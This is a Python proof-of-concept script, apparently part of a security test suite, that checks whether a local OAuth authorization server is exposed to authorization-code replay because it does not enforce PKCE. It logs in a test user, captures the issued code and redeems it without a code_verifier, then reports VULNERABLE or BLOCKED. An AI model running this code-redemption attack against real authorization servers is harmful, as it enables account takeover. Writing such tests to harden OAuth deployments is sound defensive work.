"""
attack3_pkce.py
===============
Root cause: no PKCE (RFC 7636), so an authorization code is not bound to the
client instance that requested it. If the code leaks through ANY channel
(open redirect, mix-up, malicious app on the same device, referrer/log
leakage) it is freely redeemable by whoever holds it. RFC 9700 mandates
PKCE for all clients.

Scenario (public client `spa`):
  1. Victim 'alice' completes an authorize request to the LEGITIMATE redirect
     URI. A code is issued.
  2. That code leaks to the attacker (here we simply read it -- the leak
     channel is orthogonal; the point is what the attacker can do with it).
  3. Attacker redeems the code with no code_verifier and succeeds, because
     the AS never demanded PKCE.

SUCCESS = attacker exchanges a leaked code with no verifier.
"""
import os, re, requests

AS = os.environ.get("AS", "http://localhost:5000")
LEGIT = "http://localhost:5001/spa-callback"


def attack():
    victim = requests.Session()
    victim.post(f"{AS}/login", data={"username": "alice", "password": "alicepw"},
                allow_redirects=False)

    # legitimate authorize to the registered redirect; attacker does NOT know
    # any code_verifier (the victim's real client would, if PKCE were used)
    r = victim.get(f"{AS}/authorize", params={
        "response_type": "code", "client_id": "spa",
        "redirect_uri": LEGIT, "scope": "openid", "_consent": "yes",
    }, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"code=([^&]+)", loc)
    if not m:
        return False, f"no code issued (PKCE may be required at /authorize -- good): {loc[:80]}"
    leaked_code = m.group(1)

    # attacker redeems with NO code_verifier
    tok = requests.post(f"{AS}/token", data={
        "grant_type": "authorization_code", "code": leaked_code,
        "client_id": "spa", "redirect_uri": LEGIT,
    }).json()
    if "access_token" in tok:
        return True, "leaked code redeemed with no PKCE verifier -> access_token issued"
    return False, f"token endpoint demanded PKCE / rejected (good): {tok}"


if __name__ == "__main__":
    ok, detail = attack()
    print(("[VULNERABLE] " if ok else "[BLOCKED] ") + detail)
